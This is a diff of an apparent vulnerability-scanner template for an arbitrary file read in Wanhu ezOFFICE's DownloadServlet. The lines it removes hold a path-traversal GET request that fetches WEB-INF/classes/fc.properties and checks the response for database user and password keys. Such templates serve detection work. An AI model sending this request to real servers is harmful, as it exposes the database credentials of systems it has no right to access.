@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: wanhu-oa-downloadservlet-file-read
 
 info:
@@ -9,12 +10,3 @@ info:
     app="万户网络-ezOFFICE"
   reference:
     - http://wiki.peiqi.tech/wiki/oa/%E4%B8%87%E6%88%B7OA/%E4%B8%87%E6%88%B7OA%20DownloadServlet%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html
-
-rules:
-  r0:
-    request:
-      method: GET
-      path: /defaultroot/DownloadServlet?modeType=0&key=x&path=..&FileName=WEB-INF/classes/fc.properties&name=x&encrypt=x&cd=&downloadAll=2 
-    expression: response.status == 200 && response.body.bcontains(b'ccerp.user')&& response.body.bcontains(b'ccerp.password') && response.body.bcontains(b'ccerp.url')
-expression: r0()
-  
